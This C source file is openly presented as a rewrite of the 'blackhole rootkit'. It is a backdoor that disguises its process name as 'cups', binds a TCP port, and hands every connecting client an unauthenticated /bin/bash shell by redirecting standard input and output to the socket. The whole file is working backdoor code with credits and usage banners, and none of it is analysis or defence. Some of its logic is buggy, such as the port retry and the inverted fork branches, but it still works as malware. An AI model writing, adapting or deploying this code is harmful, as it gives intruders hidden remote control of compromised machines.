// ReWrite of the famous blackhole rootkit
// this one imatates cups and is only "stable"
// when run as root
// Otherwise you are liable to get a random port

#include <stdio.h>
#include <errno.h>
#include <signal.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <strings.h>
#include <unistd.h>

#define HIDE "cups"
#define SH "/bin/bash"
#define LISTN 5

int main(int argc, char **argv)
{

/* welcome mesg */
char *con 	= "\nConnected!\n\n";
char *credit 	= "This fine tool coded by Bronc Buster\n";
char *credit2 	= "and refined by nullbytes\n";
char *instr	= "Command delimited by ';'\n";
char *instr2	= "FOR TEMPORARY USE ONLY\n";
int net_out, net_in, size; 

int P = 123; // for the love of anything holy change this

struct sockaddr_in home;
struct sockaddr_in away;
home.sin_family=AF_INET;
home.sin_port=htons(P);
home.sin_addr.s_addr=INADDR_ANY;
bzero(&(home.sin_zero),8);

  ////////////////////////////////////////////////////////////////////
 //////////////////////End of declerations///////////////////////////
////////////////////////////////////////////////////////////////////


int allow_non_root_use = 1;

if (allow_non_root_use == 1)	
{
	printf("WARNING:\nrunning this as a non-privlidged user\ncauses it to function in unexpected ways, you have been warned\n");
}
if (allow_non_root_use == 0)
{
	if(getuid() != 0)
	{
		printf("not root exiting!!!\n");
		exit(-1337);
	}
}


//changing the name in a not so sneaky way... 
strcpy(argv[0],HIDE);

//hush now....
signal(SIGCHLD,SIG_IGN);

// Will later incorperate logic to attempt correction
if((net_out=socket(AF_INET,SOCK_STREAM,0))<0)
	exit(printf("Socket error\n"));

// this loop tries the next port if bind fails 
int i = 1;
for (i = 1; i < 4; i++)	{ 
	if((bind(net_out,(struct sockaddr *)&home,sizeof(home))<0))
	{
		printf("Bind error is the port in use?\n");
		printf("port %i didn't work trying %i\n", P, P+i); 
		//This is almost certianly a bad idea. 
		home.sin_port=htons(P+1);
	}
	else	
	{
		//This doesn't always print on sucessful execution.
		printf("were good,  we're at port %i", P);
		break;
	}

}
if((listen(net_out,LISTN))<0)	
{
  printf("Listen error: I have no idea what went wrong\nLEAVING");
  exit(-1);
}

size=sizeof(struct sockaddr_in);

/* infinate loop - wait for accept*/
for(;;)
  {
  /* this sleep limits the infinite for loop so it doesn't 
   * show so high on the command top*/
  sleep(5);
 
  if((net_in=accept(net_out,(struct sockaddr *)&away, &size))<0)
    exit(printf("Accept error"));
  if(fork() !=0)
    {
    send(net_in,con,strlen(con),0); /* send out welcome mesg */
    send(net_in,credit,strlen(credit),0);
    send(net_in,credit2,strlen(credit2),0);
    send(net_in,instr,strlen(instr),0);
    send(net_in,instr2,strlen(instr2),0);
    dup2(net_in,0); /* open stdin  */
    dup2(net_in,1); /* open stdout */
    dup2(net_in,2); /* open stderr */
    execl(SH,SH,(char *)0); /* start our shell */
    close(net_in);
    exit(0); /* all done, leave and close sock */
    }
  close(net_in);
  }
}

/* EOF */

